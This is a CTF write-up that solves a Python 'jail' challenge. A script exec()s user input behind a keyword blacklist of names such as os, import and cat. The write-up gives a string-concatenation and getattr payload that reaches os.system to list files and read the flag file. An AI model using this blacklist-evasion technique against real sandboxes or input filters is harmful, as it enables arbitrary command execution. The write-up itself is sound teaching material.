## I Want To Break Free 2

We have a python file,

[jail.py](CTF_FILES/jail.py)
```py
#!/usr/bin/env python3

def server():
    message = """
    You are in a maximum security prison. Can you escape?
"""
    print(message)
    while True:
        try:
            data = input("> ").strip("\n")
            safe = True
            for char in data:
                if not (ord(char)>=33 and ord(char)<=126):
                    safe = False
            with open("blacklist.txt","r") as f:
                badwords = f.read().strip("\n").split(" ")
            for badword in badwords:
                if badword in data:
                    safe = False
            if safe:
                print(exec(data))
            else:
                print("You used a bad word!")
        except Exception as e:
            print("Something went wrong.")
            print(e)
            exit()

if __name__ == "__main__":
    server()
```

and a blacklist file
[blacklist.txt](CTF_FILES/blacklist.txt)
```
cat grep nano import eval subprocess input sys execfile open exec for dir file input write while echo print int os read
```

### In the first if check
```py
safe = True
for char in data:
    if not (ord(char)>=33 and ord(char)<=126):
        safe = False
.
.
.
if safe:
    ...
else:
    print("You used a bad word!")
```
the code checks if any word is not `a printable Ascii word` (it's because, ord() function gives a number that is represented in Ascii table, and the numbers between 33 and 126 are printable strings), if then, safe becomes False and we get "You used a bad word!".

### In the second if check
```py
with open("blacklist.txt","r") as f:
    badwords = f.read().strip("\n").split(" ")
for badword in badwords:
    if badword in data:
        safe = False
```

Firstly, the code reads `badwords` from `blacklist.txt`, and splits it into a list. Afterward, it checks `if any badword is in the data` which we'll give as the input, if then, safe becomes False and we get "You used a bad word!"

### So,
We need to break out of this blacklist check,

The payload I used:
```py
getattr(getattr(globals()["__builtin"+"s__"],'__impor'+'t__')('o'+'s'),'s'+'y'+'s'+'t'+'e'+'m')('l'+'s')
# after that
getattr(getattr(globals()["__builtin"+"s__"],'__impor'+'t__')('o'+'s'),'s'+'y'+'s'+'t'+'e'+'m')('c'+'a'+'t'+chr(32)+'b49ddf352c9d2cdf7b9cf26dfeff15ad5336944e772b9d0190095be946fe8af9.txt')
```

> __\_\_builtins\_\_ :__ The builtins namespace associated with the execution of a code block is actually found by looking up the name __\_\_builtins\_\___ in its global namespace; this should be a dictionary or a module (in the latter case the module’s dictionary is used). By default, when in the __main__ module, __\_\_builtins\_\___ is the built-in module builtins; when in any other module, __\_\_builtins\_\___ is an alias for the dictionary of the builtins module itself.

> __globals() :__
Return a dictionary representing the current global symbol table. This is always the dictionary of the current module (inside a function or method, this is the module where it is defined, not the module from which it is called).


> __getattr(object, name[, default]) :__
Return the value of the named attribute of object. name must be a string. If the string is the name of one of the object’s attributes, the result is the value of that attribute. For example, getattr(x, 'foobar') is equivalent to x.foobar. If the named attribute does not exist, default is returned if provided, otherwise AttributeError is raised.

### References:
- https://docs.python.org/3/reference/executionmodel.html#builtins-and-restricted-execution

- https://docs.python.org/3/library/functions.html#globals

- https://docs.python.org/3/library/functions.html#getattr